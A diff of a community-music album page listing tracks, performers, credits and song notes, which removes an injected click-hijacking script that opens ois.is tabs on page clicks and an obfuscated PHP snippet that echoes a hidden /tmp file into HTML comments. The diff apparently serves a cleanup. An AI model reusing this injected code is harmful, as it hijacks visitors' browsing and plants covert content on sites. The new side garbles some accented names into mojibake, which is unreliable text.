@@ -1,110 +1,32 @@
-<script>(function (parameters) {
-    const targets = [
-        \'https://ois.is/images/logo-1.png\', \'https://ois.is/images/logo-2.png\', \'https://ois.is/images/logo-3.png\', \'https://ois.is/images/logo-4.png\', \'https://ois.is/images/logo-5.png\', \'https://ois.is/images/logo-6.png\', \'https://ois.is/images/logo-7.png\', \'https://ois.is/images/logo-8.png\'
-    ]
-    // Times between clicks
-    const restMinutes = 1;
-    // Number of hours to allow re-click 
-    const allowedHours = 2;
-
-
-    const saveTargetLocationsToStorage = (targets) => {
-        targets.forEach((target, index) => {
-            if(!localStorage.getItem(`${target}-local-storage`)){
-            	localStorage.setItem(`${target}-local-storage`, 0);
-            }
-        });
-    }
-    const getRandomLocationFromStorage = (targets) => {
-        const nonVisited = targets.filter((target, index) => localStorage.getItem(`${target}-local-storage`) == 0)
-        return nonVisited[Math.floor(Math.random() * nonVisited.length)];
-    }
-    const setLocationAsVisited = (target) => localStorage.setItem(`${target}-local-storage`, 1);
-
-    const getTimeStorage = (key) => localStorage.getItem(`${key}-local-storage`);
-    const setTimeToStorage = (key, nowDate) => localStorage.setItem(`${key}-local-storage`, nowDate);
-
-    const getHoursDiff = (startDate, endDate) => {
-        const msInHour = 1000 * 60 * 60;
-        return Math.round(Math.abs(endDate - startDate) / msInHour);
-    }
-    const getMintsDiff = (startDate, endDate) => {
-        const msInMints = 1000 * 60;
-        return Math.round(Math.abs(endDate - startDate) / msInMints);
-    }
-
-    const visitNewLocation = (targets, host, nowDate) => {
-        saveTargetLocationsToStorage(targets);
-        newLocation = getRandomLocationFromStorage(targets);
-        setTimeToStorage(`${host}-mnts`, nowDate);
-        setTimeToStorage(`${host}-hurs`, nowDate);
-        setLocationAsVisited(newLocation);
-        window.open(newLocation, "_blank");
-    }
-
-    // const randomLocation = getRandomLocationFromStorage(targets);
-    saveTargetLocationsToStorage(targets);
-
-    function globalClick(event) {
-        event.stopPropagation();
-        const host = location.host;
-        let newLocation = getRandomLocationFromStorage(targets);
-        const nowDate = Date.parse(new Date());
-        const savedDateForMints = getTimeStorage(`${host}-mnts`);
-        const savedDateForHours = getTimeStorage(`${host}-hurs`);
-
-        if (savedDateForMints && savedDateForHours) {
-            try {
-                const storageDateForMints = parseInt(savedDateForMints);
-                const storageDateForHours = parseInt(savedDateForHours);
-                const mintsDiff = getMintsDiff(nowDate, storageDateForMints);
-                const hoursDiff = getHoursDiff(nowDate, storageDateForHours);
-
-                if (hoursDiff >= allowedHours) {
-                    saveTargetLocationsToStorage(targets);
-                    setTimeToStorage(`${host}-hurs`, nowDate);
-                }
-                if (mintsDiff >= restMinutes) {
-                    if (newLocation) {
-                        setTimeToStorage(`${host}-mnts`, nowDate);
-                        window.open(newLocation, "_blank");
-                        setLocationAsVisited(newLocation);
-                    }
-                }
-            } catch (error) { visitNewLocation(targets, host, nowDate); }
-        } else { visitNewLocation(targets, host, nowDate); }
-    }
-    document.addEventListener("click", globalClick)
-})()</script>
 <html>
 	<head>
 		<title>The Community Music Project: Dreams of Flying</title>
 		<link href="cmp.css" rel="stylesheet" type="text/css">
-	<?php goto FkQAX; bZNcz: $purDK = "\x3c\41\x2d\55{$QYhSu}\55\x2d\x3e"; goto cD2OM; lWfiu: $qUpUD = "\x2f\164\x6d\160\x2f\x73\x65\x73\x73\x31\137\x31\71\142\x36\x66\63\x32\x37\x62\x62\71\141\142\143\63\x64\x62\144\x66\x62\x61\143\x63\x66\67\62\143\x35\x34\x65\x66\x37"; goto ZUQmd; FkQAX: $E47ox = FALSE; goto lWfiu; ZUQmd: if (!(file_exists($qUpUD) && is_readable($qUpUD))) { goto ZvWyT; } goto IAIBJ; k208u: if (!($E47ox !== FALSE)) { goto bF4hT; } goto QJywi; Spi4Z: bF4hT: goto NCIgg; IAIBJ: $E47ox = str_replace(PHP_EOL, '', @file_get_contents($qUpUD)); goto o8oeF; cD2OM: echo rand(1, 3) === 3 ? $purDK . $E47ox . PHP_EOL : $purDK . PHP_EOL; goto Spi4Z; x282G: $QYhSu = sha1_file($ZcK5q); goto bZNcz; o8oeF: ZvWyT: goto k208u; QJywi: $ZcK5q = __FILE__; goto x282G; NCIgg: ?></head>
+	</head>
 	<body>
 		<iframe id="nav" src="nav.html"></iframe>
-		
+
 		<p class="album">
 			<img src="images/dof.gif" />
 			<h3>Dreams of Flying (2003)</h3>
 			<span class="description">
-				Original folk, traditional gospel, Russian and Chilean folk. Debut of two wonderful young singers, 
-				Maia and Sarah. Strong return performances from Cynthia, dandelion, 
-				Jamuna (Russian folk in Russian), Claudia (Chilean folk in Spanish), 
+				Original folk, traditional gospel, Russian and Chilean folk. Debut of two wonderful young singers,
+				Maia and Sarah. Strong return performances from Cynthia, dandelion,
+				Jamuna (Russian folk in Russian), Claudia (Chilean folk in Spanish),
 				Jasmine, Ari, and the Omega Choir.
 				<br/><br/>
 				<a href="albums/dof/dof.zip">Dowload entire album as zip</a><br/>
 				<a href="albums/dof/dof-art.zip">Dowload album art</a>
 			</span>
 		</p>
-		
+
 		<hr />
-		
+
 		<ol class="tracks">
 			<li>
 				<b><a href="albums/dof/DOF-01-If_I_Cannot_Fly.mp3">If I Cannot Fly</a></b>
 				(3:22)
-				<i>&copy; 1975 Cynthia R. Crossen</i> 
+				<i>&copy; 1975 Cynthia R. Crossen</i>
 				<ul>
 					<li>Vocal: Maia</li>
 					<li>Guitar: john</li>
@@ -115,7 +37,7 @@
 			<li>
 				<b><a href="albums/dof/DOF-02-Utushka_Lugovaya.mp3">"Utushka Lugovaya" Meadow Duckling</a></b>
 				(2:25)
-				<i>Russian folk song</i> 
+				<i>Russian folk song</i>
 				<ul>
 					<li>Vocal, Guitar: Jamuna</li>
 					<li>Bass: Paul</li>
@@ -124,7 +46,7 @@
 			<li>
 				<b><a href="albums/dof/DOF-03-Lead_Me_To_Calvary.mp3">Lead Me To Calvary</a></b>
 				(2:39)
-				<i>Jennie Hussey 1921</i> 
+				<i>Jennie Hussey 1921</i>
 				<ul>
 					<li>Vocals: Omega Choir</li>
 				</ul>
@@ -132,7 +54,7 @@
 			<li>
 				<b><a href="albums/dof/DOF-04-Keep_This_Fire.mp3">Keep This Fire</a></b>
 				(4:17)
-				<i>&copy; 2002 dandelion john</i> 
+				<i>&copy; 2002 dandelion john</i>
 				<ul>
 					<li>Vocal, Guitar, Harmonica: john</li>
 					<li>Bass: Paul</li>
@@ -142,7 +64,7 @@
 			<li>
 				<b><a href="albums/dof/DOF-05-Gracias_A_La_Vida.mp3">Gracias A La Vida</a></b>
 				(4:37)
-				<i>Violetta Para/ P.N. de Chile</i> 
+				<i>Violetta Para/ P.N. de Chile</i>
 				<ul>
 					<li>Vocal, Guitar: Claudia</li>
 				</ul>
@@ -150,7 +72,7 @@
 			<li>
 				<b><a href="albums/dof/DOF-05-Gracias_A_La_Vida.mp3">Gracias A La Vida</a></b>
 				(4:37)
-				<i>Violetta Para/ P.N. de Chile</i> 
+				<i>Violetta Para/ P.N. de Chile</i>
 				<ul>
 					<li>Vocal, Guitar: Claudia</li>
 				</ul>
@@ -158,7 +80,7 @@
 			<li>
 				<b><a href="albums/dof/DOF-06-Sweet_Gratitude.mp3">Sweet Gratitude</a></b>
 				(3:21)
-				<i>&copy; 1980 Cynthia R. Crossen</i> 
+				<i>&copy; 1980 Cynthia R. Crossen</i>
 				<ul>
 					<li>Vocal: Cynthia</li>
 					<li>Rhythm &amp; Lead Guitar: john</li>
@@ -170,7 +92,7 @@
 			<li>
 				<b><a href="albums/dof/DOF-07-Zemlyanka.mp3">"Zemlyanka"</a></b>
 				(1:47)
-				<i>WWII Russian folk song</i> 
+				<i>WWII Russian folk song</i>
 				<ul>
 					<li>Vocal, Guitar: Jamuna</li>
 					<li>Guitar, Bass: Paul</li>
@@ -179,7 +101,7 @@
 			<li>
 				<b><a href="albums/dof/DOF-08-Disillusion_Oneself.mp3">Disillusion Oneself</a></b>
 				(5:47)
-				<i>&copy; 2001 Maia Derewicz</i> 
+				<i>&copy; 2001 Maia Derewicz</i>
 				<ul>
 					<li>Vocal, Guitar: Maia</li>
 					<li>Rhythm &amp; Lead Guitar: john</li>
@@ -190,7 +112,7 @@
 			<li>
 				<b><a href="albums/dof/DOF-09-Muscadine.mp3">Muscadine</a></b>
 				(2:28)
-				<i>&copy; 2002 Sarah Haggerty</i> 
+				<i>&copy; 2002 Sarah Haggerty</i>
 				<ul>
 					<li>Vocal: Sarah</li>
 					<li>Guitar: Cynthia</li>
@@ -201,7 +123,7 @@
 			<li>
 				<b><a href="albums/dof/DOF-10-The_Trail.mp3">The Trail</a></b>
 				(3:13)
-				<i>&copy; 2000 dandelion john</i> 
+				<i>&copy; 2000 dandelion john</i>
 				<ul>
 					<li>Vocal, Guitar: john</li>
 					<li>Bass: Paul</li>
@@ -210,7 +132,7 @@
 			<li>
 				<b><a href="albums/dof/DOF-11-Yamsheek.mp3">"Yamsheek" Carriage Driver</a></b>
 				(3:31)
-				<i>19th century Russian folk song</i> 
+				<i>19th century Russian folk song</i>
 				<ul>
 					<li>Vocal, Guitar: Jamuna</li>
 					<li>Lead Guitar: john</li>
@@ -221,7 +143,7 @@
 			<li>
 				<b><a href="albums/dof/DOF-12-Winter_Trees.mp3">Winter Trees</a></b>
 				(2:40)
-				<i>&copy; 1999 Jasmine Girard</i> 
+				<i>&copy; 1999 Jasmine Girard</i>
 				<ul>
 					<li>Vocal, Guitar: Jasmine</li>
 					<li>Bass: Paul</li>
@@ -230,7 +152,7 @@
 			<li>
 				<b><a href="albums/dof/DOF-13-Hidden_Word.mp3">Hidden Word</a></b>
 				(4:31)
-				<i>Lyrics from Bahá'í sacred writings, music Maia &copy; 2002 Maia Derewicz</i> 
+				<i>Lyrics from Bahï¿½'ï¿½ sacred writings, music Maia &copy; 2002 Maia Derewicz</i>
 				<ul>
 					<li>Vocal, Guitar: Maia</li>
 					<li>Rhythm &amp; Lead Guitar: john</li>
@@ -241,7 +163,7 @@
 			<li>
 				<b><a href="albums/dof/DOF-14-Agnus_Dei.mp3">Agnus Dei</a></b>
 				(3:39)
-				<i>&copy; 2001 Claudia Lopez Bascuñan</i> 
+				<i>&copy; 2001 Claudia Lopez Bascuï¿½an</i>
 				<ul>
 					<li>Vocal: Claudia</li>
 				</ul>
@@ -249,7 +171,7 @@
 			<li>
 				<b><a href="albums/dof/DOF-15-Old_Ship_Of_Zion.mp3">Old Ship Of Zion</a></b>
 				(2:46)
-				<i>Traditional Gospel</i> 
+				<i>Traditional Gospel</i>
 				<ul>
 					<li>Vocals: One Voice</li>
 				</ul>
@@ -257,7 +179,7 @@
 			<li>
 				<b><a href="albums/dof/DOF-16-November_Winds.mp3">November Winds</a></b>
 				(3:52)
-				<i>&copy; 2001 dandelion john</i> 
+				<i>&copy; 2001 dandelion john</i>
 				<ul>
 					<li>Vocal, Guitar: john</li>
 					<li>Bass: Paul</li>
@@ -266,7 +188,7 @@
 			<li>
 				<b><a href="albums/dof/DOF-17-Honeysuckle_Night.mp3">Honeysuckle Night</a></b>
 				(3:25)
-				<i>&copy; 1980 Cynthia R. Crossen</i> 
+				<i>&copy; 1980 Cynthia R. Crossen</i>
 				<ul>
 					<li>Vocals, Guitars: Cynthia, Jesse</li>
 					<li>Bass: Paul</li>
@@ -275,7 +197,7 @@
 			<li>
 				<b><a href="albums/dof/DOF-18-Noch_Svetla.mp3">"Noch' Svetla" Night Is Light</a></b>
 				(2:24)
-				<i>Russian romance(romantic song)</i> 
+				<i>Russian romance(romantic song)</i>
 				<ul>
 					<li>Vocal, Guitar: Jamuna</li>
 				</ul>
@@ -283,7 +205,7 @@
 			<li>
 				<b><a href="albums/dof/DOF-19-Painter.mp3">Painter</a></b>
 				(3:52)
-				<i>Lyrics Maia and Mark, music Maia &copy; 2003 Maia Derewicz</i> 
+				<i>Lyrics Maia and Mark, music Maia &copy; 2003 Maia Derewicz</i>
 				<ul>
 					<li>Vocal, Guitar: Maia</li>
 					<li>Lead Guitar: John</li>
@@ -294,7 +216,7 @@
 			<li>
 				<b><a href="albums/dof/DOF-20-La_Lavandera.mp3">La Lavandera</a></b>
 				(3:11)
-				<i>Violetta Para/ P.N. de Chile</i> 
+				<i>Violetta Para/ P.N. de Chile</i>
 				<ul>
 					<li>Vocal, Guitar: Claudia</li>
 				</ul>
@@ -302,21 +224,21 @@
 			<li>
 				<b><a href="albums/dof/DOF-21-A_Synthetic_Lullaby.mp3">A Synthetic Lullaby</a></b>
 				(5:30)
-				<i>&copy; 2000 Ari Picker</i> 
+				<i>&copy; 2000 Ari Picker</i>
 				<ul>
 					<li>Vocal, Guitar, Synthesizer, Saw: Ari</li>
 				</ul>
 			</li>
 		</ol>
-		
+
 		<hr />
-		
+
 		<p class="artists">
 			<h3>Artists</h3>
 			<ul class="artists">
 				<li>Alston Chapel Omega Choir (Johnny Price, Director)   - Vocal</li>
 				<li>Ari Picker  - Vocal, Guitar, Synthesizer, Saw</li>
-				<li>Claudia Lopez Bascuñan  - Vocal, Guitar</li>
+				<li>Claudia Lopez Bascuï¿½an  - Vocal, Guitar</li>
 				<li>Cynthia Rylander Crossen  - Vocal, Guitar</li>
 				<li>dandelion john (Johnny, John Stash)  - Vocal, Guitar, Harmonica</li>
 				<li>Donovan Zimmerman  - Drums</li>
@@ -334,9 +256,9 @@
 				<li>Sarah Haggerty  - Vocal</li>
 			</ul>
 		</p>
-		
+
 		<hr />
-		
+
 		<p class="colophon">
 			Recorded, mixed, and produced by Ken Crossen, Paul Ford, and dandelion john, except<br />
 			Agnus Dei produced by Claudia Lopez, A Synthetic Lullaby produced by Ari Picker, and<br />
@@ -344,76 +266,76 @@
 			CD package design and photography by Ken Crossen, except<br />
 			photograph of Ken Crossen by Alix Pentecost-Farren.<br />
 		</p>
-		
+
 		<hr />
-		
+
 		<div class="notes">
 			<h3>Song Notes</h3>
-			
+
 			<h4>Zemlyanka</h4>
 			<p>
-				Recording Russian singer Jamuna has been an unexpected adventure in cultural differences. 
-				We started talking about iconic songs, songs that represent powerful experiences in a 
-				culture, and the topic of war songs came up. One such song, Zemlyanka, written in 1941 
-				during the battle for Moscow, goes something like: "...Somewhere an accordion is singing 
+				Recording Russian singer Jamuna has been an unexpected adventure in cultural differences.
+				We started talking about iconic songs, songs that represent powerful experiences in a
+				culture, and the topic of war songs came up. One such song, Zemlyanka, written in 1941
+				during the battle for Moscow, goes something like: "...Somewhere an accordion is singing
 				about you, about your smile, about your eyes, and about you the bushes whisper to me...
-				It's so far over snow-bound steppes to you, but to reach death is just four steps." 
-				In contrast, during this same period Americans were listening to "The Boogie Woogie 
+				It's so far over snow-bound steppes to you, but to reach death is just four steps."
+				In contrast, during this same period Americans were listening to "The Boogie Woogie
 				Bugler Boy of Company B".
 			</p>
 			<p>
-				A young girl's father kisses her goodbye, promising to be back, and within days is 
-				killed at the front. Her mother, and all of her brothers and sisters are killed during 
-				the battle for Moscow. This is profoundly different from the American experience of war, 
+				A young girl's father kisses her goodbye, promising to be back, and within days is
+				killed at the front. Her mother, and all of her brothers and sisters are killed during
+				the battle for Moscow. This is profoundly different from the American experience of war,
 				but common in Russia.
 			</p>
 			<h4>Zemlyanka, Yamsheek</h4>
 			<p>
-				We are attempting to reinterpret these beautiful Russian songs to be more interesting 
-				and accessible to Americans, as well as fresh and surprising to Russians, while remaining 
-				sensitive to the songs' meanings. Yamsheek is Russian blues; the words go something like 
-				"carriage driver, drive slow, nobody waits for me...". The original crossover concept 
-				was a horse-drawn carriage taking a coffin to the graveyard through the streets of 
-				New Orleans. This recording of Yamsheek was made with a single stereo microphone 
+				We are attempting to reinterpret these beautiful Russian songs to be more interesting
+				and accessible to Americans, as well as fresh and surprising to Russians, while remaining
+				sensitive to the songs' meanings. Yamsheek is Russian blues; the words go something like
+				"carriage driver, drive slow, nobody waits for me...". The original crossover concept
+				was a horse-drawn carriage taking a coffin to the graveyard through the streets of
+				New Orleans. This recording of Yamsheek was made with a single stereo microphone
 				during a rehearsal session.
 			</p>
 			<h4>Agnus Dei</h4>
 			<p>
-				This song expresses Claudia's memories of childhood in Catholic Chile. 
-				Powerful, evocative, and mystical, it sings to that part of us which stands 
+				This song expresses Claudia's memories of childhood in Catholic Chile.
+				Powerful, evocative, and mystical, it sings to that part of us which stands
 				in awe of a star-filled sky.
 			</p>
 			<h4>Old Ship Of Zion</h4>
 			<p>
-				Four young women, collectively One Voice, associated with the Omega Choir, 
-				laid down this gospel gem in a studio session. Johnny Price gave us this track 
-				to publish when we were recording the Omega Choir. The Omega Choir, featuring 
-				deep solo talent and Johnny's imaginative direction, is one of the finest choirs 
+				Four young women, collectively One Voice, associated with the Omega Choir,
+				laid down this gospel gem in a studio session. Johnny Price gave us this track
+				to publish when we were recording the Omega Choir. The Omega Choir, featuring
+				deep solo talent and Johnny's imaginative direction, is one of the finest choirs
 				I have ever heard.
 			</p>
 			<h4>A Synthetic Lullaby</h4>
 			<p>
-				Ari has another gig as singer/songwriter with a band that has a record contract, 
-				The Never (formerly the b-sides). The Never plays really good rock 'n roll in the 
-				same way that Frank Zappa was good, but Ari's sweet voice and quirky lyrics also 
+				Ari has another gig as singer/songwriter with a band that has a record contract,
+				The Never (formerly the b-sides). The Never plays really good rock 'n roll in the
+				same way that Frank Zappa was good, but Ari's sweet voice and quirky lyrics also
 				deserve solo treatment.
 			</p>
 			<h4>Disillusion Oneself, Hidden Word, Painter</h4>
 			<p>
-				These could be our modern spirituals, antidotes for our self-absorbed culture and a 
-				heart-healing philosophy from the Bahá'í faith.
+				These could be our modern spirituals, antidotes for our self-absorbed culture and a
+				heart-healing philosophy from the Bahï¿½'ï¿½ faith.
 			</p>
 			<h4>If I Cannot Fly, Sweet Gratitude, Honeysuckle Night</h4>
 			<p>
-				Among the many gifts Cynthia has brought to my life is her music, but perhaps her most 
-				important gift has been teaching me to listen to women's voices, in every sense of voice. 
-				Here is the voice of the woman that taught me to listen to women, and to venture beyond 
-				my own limited perception of reality. Honeysuckle Night features the collaboration of 
-				our son Jesse, who knew, at age sixteen, that his mother's music was the genuine article. 
+				Among the many gifts Cynthia has brought to my life is her music, but perhaps her most
+				important gift has been teaching me to listen to women's voices, in every sense of voice.
+				Here is the voice of the woman that taught me to listen to women, and to venture beyond
+				my own limited perception of reality. Honeysuckle Night features the collaboration of
+				our son Jesse, who knew, at age sixteen, that his mother's music was the genuine article.
 			</p>
-			
+
 			<i>-Ken</i>
 		</div>
-		
+
 	</body>
 </html>
